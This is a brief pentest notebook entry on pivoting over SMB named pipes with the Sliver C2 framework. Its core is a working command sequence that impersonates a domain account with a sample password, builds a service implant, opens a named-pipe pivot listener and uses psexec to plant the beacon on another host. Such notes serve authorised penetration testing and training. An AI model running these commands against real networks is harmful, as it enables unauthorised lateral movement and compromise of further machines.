---
title: SMB Pivoting
---

[[notes/pivoting/index]] over a [[notes/network/smb]] Named Pipes.

With [[notes/tools/sliver]] create a named pipe listener and use `psexec` to start the beacon on the target (in the example `EXTRA_AGGRESSION` is the current beacon and `192.168.100.39` is its IP).

~~~
sliver (EXTRA_AGGRESSION) > make-token -d corp.local -u srvadm -p "P@ssw0rd"
sliver (EXTRA_AGGRESSION) > profiles new -o windows -f service -e -p 192.168.100.39/pipe/test1 smb-svc
sliver (EXTRA_AGGRESSION) > pivots named-pipe -a -b test1
sliver (EXTRA_AGGRESSION) > psexec -p smb-svc -d test1 -s test1 srv01.corp.local
sliver (EXTRA_AGGRESSION) > rev2self
~~~
